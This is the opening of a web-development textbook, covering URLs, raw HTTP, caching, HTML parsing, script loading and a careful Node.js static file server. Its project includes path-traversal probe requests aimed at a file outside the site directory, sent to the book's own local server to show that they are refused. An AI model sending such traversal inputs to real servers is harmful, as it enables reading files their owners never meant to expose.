---
title: "HTML, CSS, and JavaScript from Zero to Advanced"
subtitle: "How the web platform really works — from HTTP and the rendering pipeline to layout, the event loop, TypeScript, security, performance, and a framework-free application"
lang: en
---

# Preface

The web platform is the most widely deployed application platform there is, and one of the least understood by the people who build on it. Many developers learn it as a pile of recipes — a flexbox incantation, a `useEffect` for fetching, a header pasted from Stack Overflow to make CORS "go away" — and the recipes work until they do not. This book builds the model underneath the recipes.

It starts below the page: what a URL is, what HTTP messages look like on the wire, how caching and validation work, and how a browser turns bytes into a document tree and then into pixels. It then teaches HTML as a language of meaning (semantics, forms, accessibility), CSS as a system of rules (the cascade, the box model, flexbox, grid, custom properties, container queries, animation), and JavaScript from its core semantics through closures, prototypes, classes, the event loop, promises, the DOM, modules, and TypeScript. The second half is about building real things: networking, storage and offline apps, performance and Core Web Vitals, security, testing, and Node.js — ending with a single-page application written without a framework, so that you know what frameworks do for you.

Three promises shape every page:

1. **Precision.** Each *Deep & Tricky* fact is labelled with its source of truth: the HTML Living Standard, a CSS specification, ECMAScript (ECMA-262), an RFC, or the documented behaviour of a browser or Node.js.
2. **Evidence.** Every program shown with output was run — JavaScript with Node.js 22, pages in a real headless Chromium (version 153) driven from the command line — and the output is real. Where a first attempt was wrong in an instructive way, the book says so.
3. **Order.** Nothing is used before it is taught; later chapters refer back by unit number.

# How to use this book

## Who it is for

- **Beginners:** start at Chapter 0 and read in order. Type every example, run it, and change it.
- **Programmers from other languages:** read Chapters 0–4 quickly, then slowly from Chapter 5: JavaScript's equality, numbers, `this`, and the event loop differ from what you expect.
- **Working web developers:** skim the summaries and read every *Deep & Tricky* entry; Chapters 2, 6, 7, 11, 13, and 14 usually contain the most new material.

## The shape of a unit

| Part | What it gives you |
| --- | --- |
| **One-line summary** | The whole idea in one sentence. |
| **Lesson** | Small complete programs and their real output. |
| **Deep & Tricky (DT-n)** | Precise facts that surprise experienced developers, labelled with their source of truth. |
| **Patterns (P-n)** | Engineering practices with their trade-offs. |
| **Mastery check** | *Predict* questions; answers at the end of each chapter. |

Each chapter ends with a **Chapter Project**: a realistic program with complete code, real output, and a review checklist.

## Running the code

Every file in the book starts with a comment naming its path, such as `// file: http/url.mjs` or `<!-- file: render/parse.html -->`; the source archive contains them all, arranged by chapter. You need:

- **Node.js 22 or later** (`node --version`). Node scripts in the early chapters use the `.mjs` extension, which makes them ES modules (Chapter 9 explains why that matters).
- **A modern browser.** To show what a page does in print, this book runs pages in headless Chromium with a small driver, `tools/page.py` (below), which prints the page's console output and the results of expressions. When you read, simply open the same files in your own browser with the developer tools open — the Console shows the same lines.
- For the driver itself: Python 3 and Playwright (`pip install playwright && playwright install chromium`).

Commands are shown as `$ command` followed by their real output. The driver:

```python
# file: ../tools/page.py
"""Drive a real browser (headless Chromium, through Playwright) from the command line.

    python3 page.py TARGET [STEP ...] [--serve CMD [--server-log]] [--width W] [--height H]
                    [--dpr N] [--media FEATURE] [--slow]

TARGET is a file (opened as file://) or a URL. Console messages and uncaught errors
are printed as they happen. STEPs run in order:
    eval:EXPR       evaluate a JavaScript expression and print "=> result" (JSON)
    click:SEL       click the element matching a CSS selector
    hover:SEL       move the mouse over it
    mouse:X,Y       click at a position (no waiting for the page, unlike click:)
    fill:SEL|TEXT   type TEXT into an input
    upload:SEL|FILE choose FILE in a file input
    press:KEY       press a key (e.g. Enter, Tab)
    wait:MS         wait MS milliseconds
    viewport:WxH    resize the viewport
    media:dark      emulate prefers-color-scheme: dark (or light, reduce for reduced motion)
    offline:on|off  cut or restore the browser's network connection
    reload          reload the page
    shot:FILE       save a screenshot
    aria:SEL        print the accessibility tree of an element, as the browser exposes it
--dpr N sets the device pixel ratio (default 1); --media dark|light|reduce emulates
a media feature from the start; --slow emulates a slow network (400 ms latency, 400 kB/s)
and a 4x slower CPU.
--serve CMD starts a server first (e.g. "node server.js"), waits until TARGET answers,
and stops it at the end; the server's own output is shown only with --server-log.
"""
import json
import os
import shlex
import subprocess
import sys
import time
import urllib.request
from playwright.sync_api import sync_playwright

def main():
    args, steps, serve, width, height, dpr, server_log = sys.argv[1:], [], None, 800, 600, 1, False
    media, slow = [], False
    target = args.pop(0)
    while args:
        a = args.pop(0)
        if a == "--serve": serve = args.pop(0)
        elif a == "--width": width = int(args.pop(0))
        elif a == "--height": height = int(args.pop(0))
        elif a == "--dpr": dpr = float(args.pop(0))
        elif a == "--server-log": server_log = True
        elif a == "--media": media.append(args.pop(0))
        elif a == "--slow": slow = True
        else: steps.append(a)
    server = None
    if serve:
        server = subprocess.Popen(shlex.split(serve), start_new_session=True,
                                  stdout=None if server_log else subprocess.DEVNULL)
        for _ in range(100):                                  # wait up to 10 s for the server
            try:
                urllib.request.urlopen(urllib.request.Request(target, method="HEAD"), timeout=1); break
            except urllib.error.HTTPError:
                break                                         # it answered, even if with an error
            except Exception:
                time.sleep(0.1)
    if "://" not in target:
        target = "file://" + os.path.abspath(target)
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch()
            page = browser.new_page(viewport={"width": width, "height": height}, device_scale_factor=dpr)
            if slow:
                cdp = page.context.new_cdp_session(page)
                cdp.send("Network.emulateNetworkConditions", {"offline": False, "latency": 400,
                         "downloadThroughput": 400_000, "uploadThroughput": 400_000})
                cdp.send("Emulation.setCPUThrottlingRate", {"rate": 4})
            for m in media:
                page.emulate_media(**({"reduced_motion": "reduce"} if m == "reduce" else {"color_scheme": m}))
            page.on("console", lambda m: print(m.text, flush=True))
            page.on("pageerror", lambda e: print(f"Uncaught {e.name}: {e.message}", flush=True))
            page.goto(target)
            for step in steps:
                kind, _, arg = step.partition(":")
                if kind == "eval":
                    print("=>", json.dumps(page.evaluate(arg)), flush=True)
                elif kind == "click": page.click(arg)
                elif kind == "hover": page.hover(arg)
                elif kind == "mouse":
                    x, y = map(float, arg.split(","))
                    page.mouse.click(x, y)
                elif kind == "fill":
                    sel, _, text = arg.partition("|")
                    page.fill(sel, text)
                elif kind == "upload":
                    sel, _, file = arg.partition("|")
                    page.set_input_files(sel, file)
                elif kind == "press": page.keyboard.press(arg)
                elif kind == "wait": page.wait_for_timeout(int(arg))
                elif kind == "viewport":
                    w, h = map(int, arg.split("x"))
                    page.set_viewport_size({"width": w, "height": h})
                elif kind == "media":
                    if arg == "reduce": page.emulate_media(reduced_motion="reduce")
                    else: page.emulate_media(color_scheme=arg)
                elif kind == "offline": page.context.set_offline(arg == "on")
                elif kind == "reload": page.reload()
                elif kind == "shot": page.screenshot(path=arg)
                elif kind == "aria": print(page.locator(arg).first.aria_snapshot(), flush=True)
                else: sys.exit(f"unknown step {step!r}")
            page.wait_for_timeout(50)                         # let late console messages arrive
            browser.close()
    finally:
        if server:
            os.killpg(server.pid, 15)

if __name__ == "__main__":
    main()
```

A command such as `python3 ../../tools/page.py demo.html "eval:document.title"` opens `demo.html`, prints what the page logs, and then prints `=> "..."`, the value of the expression. With `--serve "node server.mjs"`, the driver starts a local server first and stops it at the end (add `--server-log` to see what the server prints).

## Reading order

**Part I (Chapters 0–4)** is the platform and its two declarative languages: how the web works, HTML, CSS fundamentals, layout, and modern CSS. **Part II (Chapters 5–10)** is JavaScript: the core language, functions and objects, asynchronous programming and the event loop, the DOM and browser APIs, modules and tooling, and TypeScript. **Part III (Chapters 11–17)** builds applications: networking, storage and offline, performance, security, testing, Node.js, and the capstone application.

# Chapter 0 — How the Web Works

*Goal: see what actually happens between typing a URL and seeing a page. You will read URLs the way the browser's parser does, write HTTP by hand over a raw socket, watch a cache validate a resource with ETags, see the tree the HTML parser really builds from sloppy markup, and measure how a single slow script holds up the whole page. The chapter ends with a careful static file server that the rest of the book can use.*

**What you will be able to do after this chapter**

- Take a URL apart into scheme, host, port, path, query, and fragment, and resolve relative URLs.
- Read and write HTTP/1.1 requests and responses, and explain methods, status codes, and headers.
- Explain how browsers and servers avoid re-sending unchanged resources (`Cache-Control`, `ETag`, `304`).
- Describe the rendering pipeline — parse, style, layout, paint, composite — and how scripts interrupt it.
- Write a static file server that is correct about content types, caching, and path traversal.

## Topic 0A — Addresses and messages

## Unit 0.1 — URLs

**One-line summary:** A URL names a resource and says how to reach it — `scheme://host:port/path?query#fragment` — and the browser parses it by a precise algorithm (the WHATWG URL Standard) that normalises case, default ports, and `.`/`..` segments, resolves relative URLs against a base, and converts international domain names to ASCII; Node.js and browsers expose the same parser as `URL`.

```js
// file: http/url.mjs
// The parts of a URL, as the browser's own URL parser sees them.
const u = new URL("https://user:pw@shop.example.com:8443/en/cart/items?id=42&sort=price#reviews");
for (const part of ["protocol", "username", "hostname", "port", "pathname", "search", "hash", "origin"])
  console.log(part.padEnd(9), u[part]);
console.log("id =", u.searchParams.get("id"), "| sort =", u.searchParams.get("sort"));
console.log(new URL("../img/logo.png", "https://a.example/docs/guide/page.html").href);   // relative URL
console.log(new URL("https://EXAMPLE.com:443/a/./b/../c").href);                           // normalised
console.log(new URL("https://例え.jp/").hostname);                                          // IDN -> punycode
console.log(encodeURIComponent("a b&c=d/é"), "|", new URLSearchParams({ q: "a b&c" }).toString());
```

```console
$ cd http && node url.mjs
protocol  https:
username  user
hostname  shop.example.com
port      8443
pathname  /en/cart/items
search    ?id=42&sort=price
hash      #reviews
origin    https://shop.example.com:8443
id = 42 | sort = price
https://a.example/docs/img/logo.png
https://example.com/a/c
xn--r8jz45g.jp
a%20b%26c%3Dd%2F%C3%A9 | q=a+b%26c
```

The pieces, and who uses them:

| Part | Example | Meaning |
| --- | --- | --- |
| scheme | `https:` | Protocol: `https`, `http`, `file`, `data`, `blob`, `mailto`… |
| host | `shop.example.com` | Found through DNS, which turns the name into an IP address |
| port | `8443` | TCP port; empty means the default (443 for https, 80 for http) |
| path | `/en/cart/items` | Which resource on that server — the server decides what it means |
| query | `?id=42&sort=price` | Parameters, usually `name=value` pairs joined with `&` |
| fragment | `#reviews` | A location *within* the page; **never sent to the server** |
| origin | `https://shop.example.com:8443` | scheme + host + port: the unit of the browser's security model (Chapter 14) |

Text in a URL must be encoded: `encodeURIComponent` escapes everything that has a meaning in a URL (`&`, `=`, `/`, space, non-ASCII bytes of UTF-8); `URLSearchParams` produces form-style encoding, where a space becomes `+`.

Before any HTTP is sent, the browser looks up the host's IP address with **DNS**, opens a **TCP** connection to it, and — for `https` — performs a **TLS** handshake, which encrypts the connection and checks the server's certificate against the host name. HTTP/2 and HTTP/3 change how the bytes travel (binary frames, many requests over one connection; HTTP/3 over QUIC on UDP), but not the meaning of requests and responses, which is what the rest of this chapter is about.

### Mastery check

1. **Predict.** What is `new URL("../../x", "https://a.example/b/c/d").href`?
2. **Explain.** Why is a fragment never sent to the server? Give a feature that depends on that.

## Unit 0.2 — HTTP messages

**One-line summary:** HTTP/1.1 is a text protocol: a request is a request line (method, target, version), header lines, a blank line, and an optional body; a response is a status line, headers, a blank line, and a body — and everything a framework does is built on reading and writing those few lines.

The smallest server, in Node.js:

```js
// file: http/hello-server.mjs
// The smallest useful web server: Node's http module, one response for every request.
import http from "node:http";

const server = http.createServer((req, res) => {
  console.log(`${req.method} ${req.url} HTTP/${req.httpVersion}`);
  res.writeHead(200, { "Content-Type": "text/plain; charset=utf-8" });
  res.end(`You asked for ${req.url}\n`);
});
server.listen(8080, () => console.log("listening on http://localhost:8080/"));
```

And a client that speaks HTTP by hand, over a plain TCP socket:

```js
// file: http/raw-client.mjs
// Speak HTTP/1.1 by hand over a TCP socket: an HTTP message is just text.
import net from "node:net";

const socket = net.connect(8080, "localhost", () => {
  socket.write("GET /hello?x=1 HTTP/1.1\r\n" +
               "Host: localhost:8080\r\n" +
               "Connection: close\r\n" +
               "\r\n");                                   // a blank line ends the headers
});
socket.on("data", (chunk) => process.stdout.write(chunk.toString()));
```

```console
$ cd http && { node hello-server.mjs & S=$!; sleep 0.5; node raw-client.mjs; kill $S; }
listening on http://localhost:8080/
GET /hello?x=1 HTTP/1.1
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Date: Mon, 16 Nov 2026 11:01:37 GMT
Connection: close
Transfer-Encoding: chunked

19
You asked for /hello?x=1

0
```

Everything is visible: the server printed the request line it received; the response is a status line (`200 OK`), headers, a blank line, and the body. Because the body's length was not known in advance, Node sent it with `Transfer-Encoding: chunked`: each chunk is preceded by its length in hexadecimal (`19` = 25 bytes, including the newline), and a zero-length chunk ends the body.

**Methods** say what the client wants: `GET` (read; must not change anything), `HEAD` (like GET without the body), `POST` (submit data or perform an action), `PUT` (replace), `PATCH` (modify), `DELETE`, and `OPTIONS` (ask what is allowed — used by CORS, Chapter 11). GET, HEAD, OPTIONS, PUT, and DELETE are **idempotent**: repeating them has the same effect as doing them once, so clients and proxies may retry them.

**Status codes** are grouped by their first digit: 1xx informational, **2xx success** (200 OK, 201 Created, 204 No Content), **3xx redirection** (301/308 permanent, 302/303/307 temporary, 304 Not Modified), **4xx client error** (400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 405 Method Not Allowed, 429 Too Many Requests), **5xx server error** (500, 502 Bad Gateway, 503 Service Unavailable).

**Headers** carry everything else: `Content-Type` (what the body is), `Content-Length`, `Host` (required in HTTP/1.1: many sites share one IP address), `Cookie`/`Set-Cookie` (Chapter 12), caching headers (next unit), and security headers (Chapter 14).

### Deep & Tricky

**DT-1. HTTP header names are case-insensitive, and HTTP/2 and HTTP/3 transmit them in lower case only; Node.js lower-cases the names in `req.headers`, and the Fetch API's `Headers` object matches names case-insensitively — so code that looks up `req.headers["Content-Type"]` gets `undefined`, even though the client sent exactly `Content-Type`.** *(RFC 9110 §5.1: "Field names are case-insensitive"; RFC 9113 §8.2.1; Node.js documentation, `message.headers`: "Header names are lower-cased")*

### Mastery check

1. **Explain.** Why does HTTP/1.1 require a `Host` header, when the client already connected to a specific IP address?
2. **Predict.** In the raw client, what happens if you leave out the final `"\r\n"` (the blank line)?

## Unit 0.3 — Caching and validation

**One-line summary:** Browsers and proxies keep copies of responses; `Cache-Control` tells them how long a copy may be used without asking (`max-age`) or that it must be revalidated first (`no-cache`), and validators — an `ETag` or a `Last-Modified` date — let the client ask "has it changed?" with `If-None-Match`, to which an unchanged resource answers `304 Not Modified` with no body.

```js
// file: http/cache-server.mjs
// Validation caching: the server labels each version of a resource with an ETag;
// a client that already has that version asks "has it changed?" and gets 304 with no body.
import http from "node:http";
import { createHash } from "node:crypto";

let body = "version 1 of the stylesheet\n";
http.createServer((req, res) => {
  if (req.url === "/edit") { body = "version 2 of the stylesheet\n"; return res.end("edited\n"); }
  const etag = `"${createHash("sha256").update(body).digest("hex").slice(0, 16)}"`;
  const headers = { "ETag": etag, "Cache-Control": "no-cache" };   // may store, must revalidate
  if (req.headers["if-none-match"] === etag) {
    res.writeHead(304, headers).end();                             // not modified: no body
  } else {
    res.writeHead(200, { ...headers, "Content-Type": "text/css" }).end(body);
  }
}).listen(8082);
```

```js
// file: http/cache-client.mjs
// Plays the part of a browser cache: remember the ETag, send it back as If-None-Match.
const url = "http://localhost:8082/style.css";
let cached = null;                                   // { etag, body }

async function get() {
  const headers = cached ? { "If-None-Match": cached.etag } : {};
  const res = await fetch(url, { headers });
  if (res.status === 304) {
    console.log(`304 Not Modified -> use the cached copy: ${cached.body.trim()}`);
  } else {
    cached = { etag: res.headers.get("etag"), body: await res.text() };
    console.log(`${res.status} ${res.statusText}, ETag ${cached.etag}: ${cached.body.trim()}`);
  }
}

await get();
await get();
await fetch("http://localhost:8082/edit");           // the file changes on the server
await get();
await get();
```

```console
$ cd http && { node cache-server.mjs & S=$!; sleep 0.5; node cache-client.mjs; kill $S; }
200 OK, ETag "f025cbeaae1973ed": version 1 of the stylesheet
304 Not Modified -> use the cached copy: version 1 of the stylesheet
200 OK, ETag "e95e85dc9f4ac843": version 2 of the stylesheet
304 Not Modified -> use the cached copy: version 2 of the stylesheet
```

The second request costs a round trip but no body; after the edit, the ETag changes and the full new version is sent. The main `Cache-Control` directives:

| Directive | Meaning |
| --- | --- |
| `max-age=N` | Fresh for N seconds: reuse without asking |
| `no-cache` | May store, but must revalidate before every use |
| `no-store` | Do not store at all (sensitive data) |
| `private` / `public` | Only the user's browser may store it / shared caches (CDNs) may too |
| `immutable` | Will never change during its lifetime: do not even revalidate on reload |

The standard production pattern combines them: HTML is served with `no-cache` (always checked, so a new deployment is seen at once), while CSS, JavaScript, and images get names that contain a hash of their content (`app.3f9a1c.js`) and `max-age=31536000, immutable` — when they change, they get a new name, so they never need revalidating. Build tools do this automatically (Chapter 9).

### Deep & Tricky

**DT-2. `no-cache` does not mean "do not cache" — it means "cache, but revalidate before each use"; the directive that forbids storing is `no-store`. Conversely, a response with no caching headers at all may still be cached: browsers apply *heuristic freshness*, typically 10% of the time since `Last-Modified`, so a page last modified 10 days ago can be reused for a day without asking.** *(RFC 9111 §5.2.2.4 "no-cache", §5.2.2.5 "no-store", §4.2.2 "Calculating Heuristic Freshness")*

### Mastery check

1. **Explain.** Why is `max-age=31536000` safe for `app.3f9a1c.js` but dangerous for `index.html`?

## Topic 0B — From bytes to pixels

## Unit 0.4 — Parsing: the DOM the browser actually builds

**One-line summary:** The HTML parser never rejects a document: the HTML Standard specifies exactly how every error is recovered, so missing end tags, misnested elements, and content in the wrong place are silently rearranged — and the resulting Document Object Model (DOM) tree, not the source text, is what CSS and JavaScript see.

```html
<!-- file: render/parse.html -->
<!DOCTYPE html>
<title>What the parser builds</title>
<p>One <p>Two
<p>A <div>block</div> in a paragraph?
<table><tr><td>cell</td></tr><b>bold in a table</b></table>
<ul><li>first<li>second</ul>
<script>
  // Print the tree the parser actually built, one element per line, indented by depth.
  function dump(node, depth = 0) {
    for (const child of node.children) {
      const text = [...child.childNodes].filter((n) => n.nodeType === Node.TEXT_NODE)
        .map((n) => n.textContent.trim()).filter(Boolean).join(" ");
      if (child.tagName !== "SCRIPT")
        console.log("  ".repeat(depth) + child.tagName.toLowerCase() + (text ? `  "${text}"` : ""));
      dump(child, depth + 1);
    }
  }
  dump(document.documentElement);
</script>
```

```console
$ cd render && python3 ../../tools/page.py parse.html
head
  title  "What the parser builds"
body  "in a paragraph?"
  p  "One"
  p  "Two"
  p  "A"
  div  "block"
  b  "bold in a table"
  table
    tbody
      tr
        td  "cell"
  ul
    li  "first"
    li  "second"
```

Nothing in the output matches the source exactly:

- `<p>One <p>Two` produces two *sibling* paragraphs: a `<p>` start tag closes an open paragraph.
- `<p>A <div>block</div> in a paragraph?` — a `<div>` cannot be inside a `<p>`, so the parser closes the paragraph before the `<div>`, and the text after `</div>` ends up directly in `<body>`.
- `<b>` inside a `<table>` but outside a cell is **foster-parented**: moved out, in front of the table. A `<tbody>` was inserted, too.
- The `<li>` and the `<head>`, `<html>`, and `<body>` elements were never closed (or opened) in the source; the parser created and closed them.

After parsing, the browser **styles** the tree (matching CSS rules to elements: Chapter 2), computes **layout** (each box's position and size: Chapter 3), **paints** the boxes into layers, and **composites** the layers on the screen. Each later change to the DOM or to styles invalidates part of this pipeline, and much of web performance (Chapter 13) is about invalidating as little as possible.

### Deep & Tricky

**DT-3. Viewing the page source shows what the server sent; the browser's DevTools Elements panel and `document.body.innerHTML` show the DOM after error recovery and after scripts ran — and the two can differ in structure, not only in content. A CSS selector such as `p > div`, or a script that expects a `<div>` inside a `<p>`, fails against markup that "looks" right in the source.** *(HTML Living Standard §13.2, "Parsing HTML documents", in particular the "in body" and "in table" insertion modes and foster parenting, §13.2.6.1)* Validators (validator.w3.org) report these errors; browsers never will.

### Mastery check

1. **Predict.** What DOM does `<a href="#">one <a href="#">two</a></a>` produce?

## Unit 0.5 — Scripts and the critical rendering path

**One-line summary:** A classic `<script src>` stops the HTML parser until the script has been downloaded and run, so everything after it waits; `defer` downloads in parallel and runs after parsing, in document order, before `DOMContentLoaded`; `async` downloads in parallel and runs as soon as it arrives, in any order — and module scripts behave like `defer` by default.

To see it, a server that delays every script by 500 ms:

```js
// file: render/slow-server.mjs
// Serves the files in this directory, but delays every .js file by 500 ms,
// so that we can see what a slow script does to the page.
import http from "node:http";
import { readFile } from "node:fs/promises";

const types = { ".html": "text/html; charset=utf-8", ".js": "text/javascript", ".css": "text/css" };
http.createServer(async (req, res) => {
  const path = new URL(req.url, "http://x").pathname;
  const ext = path.slice(path.lastIndexOf("."));
  try {
    const body = await readFile("." + path);
    if (ext === ".js") await new Promise((r) => setTimeout(r, 500));
    res.writeHead(200, { "Content-Type": types[ext] ?? "application/octet-stream" });
    res.end(body);
  } catch {
    res.writeHead(404).end("not found\n");
  }
}).listen(8081);
```

```js
// file: render/slow.js
console.log(`slow.js runs at ${Math.round(performance.now())} ms; ` +
            `paragraph exists: ${document.getElementById("after") !== null}`);
```

```html
<!-- file: render/defer.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>defer script</title>
  <script>
    document.addEventListener("DOMContentLoaded", () =>
      console.log(`DOMContentLoaded at ${Math.round(performance.now())} ms`));
  </script>
</head>
<body>
  <p>Before the script.</p>
  <script defer src="slow.js"></script>
  <p id="after">After the script.</p>
  <script>console.log(`parser reached the end of the body at ${Math.round(performance.now())} ms`);</script>
</body>
</html>
```

`blocking.html` and `async.html` are the same page with `<script src="slow.js">` and `<script async src="slow.js">`:

```html
<!-- file: render/blocking.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>blocking script</title>
  <script>
    document.addEventListener("DOMContentLoaded", () =>
      console.log(`DOMContentLoaded at ${Math.round(performance.now())} ms`));
  </script>
</head>
<body>
  <p>Before the script.</p>
  <script src="slow.js"></script>
  <p id="after">After the script.</p>
  <script>console.log(`parser reached the end of the body at ${Math.round(performance.now())} ms`);</script>
</body>
</html>
```

```html
<!-- file: render/async.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>async script</title>
  <script>
    document.addEventListener("DOMContentLoaded", () =>
      console.log(`DOMContentLoaded at ${Math.round(performance.now())} ms`));
  </script>
</head>
<body>
  <p>Before the script.</p>
  <script async src="slow.js"></script>
  <p id="after">After the script.</p>
  <script>console.log(`parser reached the end of the body at ${Math.round(performance.now())} ms`);</script>
</body>
</html>
```

```console
$ cd render && python3 ../../tools/page.py http://localhost:8081/blocking.html --serve "node slow-server.mjs" --server-log
slow.js runs at 531 ms; paragraph exists: false
parser reached the end of the body at 531 ms
DOMContentLoaded at 532 ms
$ cd render && python3 ../../tools/page.py http://localhost:8081/defer.html --serve "node slow-server.mjs" --server-log
parser reached the end of the body at 23 ms
slow.js runs at 529 ms; paragraph exists: true
DOMContentLoaded at 530 ms
$ cd render && python3 ../../tools/page.py http://localhost:8081/async.html --serve "node slow-server.mjs" --server-log
parser reached the end of the body at 17 ms
DOMContentLoaded at 19 ms
slow.js runs at 524 ms; paragraph exists: true
```

With the blocking script, the parser stops at the `<script>` for half a second: the paragraph after it does not exist yet when the script runs, and nothing after the script — including content the user could have been reading — is parsed until then. With `defer`, parsing finishes in a few milliseconds, the script runs afterwards with the whole DOM available, and `DOMContentLoaded` waits for it. With `async`, parsing and `DOMContentLoaded` do not wait at all, and the script runs whenever it arrives.

### Pattern

**P-1. Put scripts in the `<head>` with `defer` (or use `type="module"`, which defers by default), use `async` only for independent scripts such as analytics, and never put a classic synchronous `<script src>` before content.** *(HTML Living Standard §4.12.1, the `async` and `defer` attributes; web.dev, "Critical rendering path")* *Trade-off:* deferred scripts cannot use `document.write` and run later than a blocking script would — for code that must run before the first paint (setting a dark theme to avoid a flash), a small *inline* script in the head is the tool.

### Mastery check

1. **Predict.** A page has `<script defer src="a.js">` then `<script defer src="b.js">`, and `b.js` arrives first. Which runs first?
2. **Explain.** Why does a stylesheet in the `<head>` also delay a following inline script?

## Chapter 0 Project — A static file server

### Requirements

Write a static file server in Node.js, using only the standard library, that serves a site directory to a browser correctly:

- `Content-Type` from the file extension, with `charset=utf-8` for text; `X-Content-Type-Options: nosniff`.
- A directory URL serves its `index.html`.
- Validation caching: a weak `ETag` from size and modification time, `Cache-Control: no-cache`, and `304 Not Modified` for a matching `If-None-Match`.
- `GET` and `HEAD` only; other methods get `405` with an `Allow` header.
- `404` for missing files, malformed escapes, and any path outside the site directory, however it is encoded.
- One log line per request.

Test it with a real browser (load and reload) and with hand-written requests a browser would never send.

### Reference solution

```js
// file: project/static.mjs
// A small, careful static file server: content types, index.html for directories,
// ETag validation with 304 responses, HEAD, and no escape from the site directory.
import http from "node:http";
import { stat, readFile } from "node:fs/promises";
import path from "node:path";

const ROOT = path.resolve(process.argv[2] ?? "site");
const PORT = Number(process.argv[3] ?? 8083);
const TYPES = {
  ".html": "text/html; charset=utf-8", ".css": "text/css; charset=utf-8",
  ".js": "text/javascript; charset=utf-8", ".mjs": "text/javascript; charset=utf-8",
  ".json": "application/json", ".svg": "image/svg+xml", ".png": "image/png",
  ".txt": "text/plain; charset=utf-8",
};

async function resolveFile(urlPath) {
  let decoded;
  try { decoded = decodeURIComponent(urlPath); } catch { return null; }   // malformed %-escape
  const file = path.join(ROOT, path.normalize(decoded));
  if (file !== ROOT && !file.startsWith(ROOT + path.sep)) return null;   // tried to leave ROOT
  let info = await stat(file).catch(() => null);
  if (info?.isDirectory()) {
    const index = path.join(file, "index.html");
    info = await stat(index).catch(() => null);
    return info?.isFile() ? { file: index, info } : null;
  }
  return info?.isFile() ? { file, info } : null;
}

const server = http.createServer(async (req, res) => {
  const done = (status) => console.log(`${req.method} ${req.url} -> ${status}`);
  if (req.method !== "GET" && req.method !== "HEAD") {
    res.writeHead(405, { Allow: "GET, HEAD" }).end();
    return done(405);
  }
  const found = await resolveFile(new URL(req.url, "http://x").pathname);
  if (!found) {
    res.writeHead(404, { "Content-Type": "text/plain; charset=utf-8" }).end("Not found\n");
    return done(404);
  }
  const { file, info } = found;
  const etag = `W/"${info.size.toString(16)}-${Math.floor(info.mtimeMs).toString(16)}"`;
  const headers = {
    "Content-Type": TYPES[path.extname(file)] ?? "application/octet-stream",
    "ETag": etag,
    "Cache-Control": "no-cache",                   // store, but check with the server each time
    "X-Content-Type-Options": "nosniff",
  };
  if (req.headers["if-none-match"] === etag) {
    res.writeHead(304, headers).end();
    return done(304);
  }
  const body = await readFile(file);
  res.writeHead(200, { ...headers, "Content-Length": body.length });
  res.end(req.method === "HEAD" ? undefined : body);
  done(200);
});
server.listen(PORT, () => console.log(`serving ${path.basename(ROOT)}/ on http://localhost:${PORT}/`));
```

```html
<!-- file: project/site/index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Static site</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <h1>It works</h1>
  <script>
    console.log(`h1 colour: ${getComputedStyle(document.querySelector("h1")).color}`);
  </script>
</body>
</html>
```

```css
/* file: project/site/style.css */
h1 { color: rebeccapurple; }
```

```text
# file: project/secret.txt
This file is outside site/ and must never be served.
```

```js
// file: project/probe.mjs
// Requests that a browser would never send, written straight to the socket.
import net from "node:net";

function raw(requestLine) {
  return new Promise((resolve) => {
    const s = net.connect(8083, "localhost", () =>
      s.write(`${requestLine}\r\nHost: localhost\r\nConnection: close\r\n\r\n`));
    let text = "";
    s.on("data", (d) => (text += d));
    s.on("end", () => resolve(text.split("\r\n")[0]));
  });
}
for (const line of ["GET /../secret.txt HTTP/1.1", "GET /..%2fsecret.txt HTTP/1.1",
                    "GET /%E0%A4%A HTTP/1.1", "DELETE /index.html HTTP/1.1", "HEAD / HTTP/1.1"])
  console.log(`${line.padEnd(36)} => ${await raw(line)}`);
```

```console
$ cd project && python3 ../../tools/page.py http://localhost:8083/ "eval:location.reload()" wait:500 --serve "node static.mjs site" --server-log
serving site/ on http://localhost:8083/
HEAD / -> 200
GET / -> 200
GET /style.css -> 200
h1 colour: rgb(102, 51, 153)
=> null
GET / -> 304
GET /style.css -> 304
h1 colour: rgb(102, 51, 153)
$ cd project && { node static.mjs site > /dev/null & S=$!; sleep 0.5; node probe.mjs; kill $S; }
GET /../secret.txt HTTP/1.1          => HTTP/1.1 404 Not Found
GET /..%2fsecret.txt HTTP/1.1        => HTTP/1.1 404 Not Found
GET /%E0%A4%A HTTP/1.1               => HTTP/1.1 404 Not Found
DELETE /index.html HTTP/1.1          => HTTP/1.1 405 Method Not Allowed
HEAD / HTTP/1.1                      => HTTP/1.1 200 OK
```

The first visit (after the driver's `HEAD` probe) fetches the page and the stylesheet with `200`; the reload revalidates both and gets `304` — no bodies are sent — and the page still renders with the cached stylesheet. The hand-written requests are all refused, including the one with an encoded slash. That one deserves a closer look:

```js
// file: project/traversal.mjs
// Why static.mjs normalises the decoded path *before* joining it to ROOT.
import path from "node:path";
const ROOT = "/srv/site";
const decoded = decodeURIComponent("/..%2fsecret.txt");          // the URL parser leaves %2f alone
console.log("decoded path:              ", decoded);
console.log("path.join(ROOT, decoded):  ", path.join(ROOT, decoded));
console.log("normalise, then join:      ", path.join(ROOT, path.normalize(decoded)));
console.log("URL parser on /a/../b:     ", new URL("/a/../b", "http://x").pathname,
            "  on /..%2fsecret.txt:", new URL("/..%2fsecret.txt", "http://x").pathname);
```

```console
$ cd project && node traversal.mjs
decoded path:               /../secret.txt
path.join(ROOT, decoded):   /srv/secret.txt
normalise, then join:       /srv/site/secret.txt
URL parser on /a/../b:      /b   on /..%2fsecret.txt: /..%2fsecret.txt
```

### Deep & Tricky

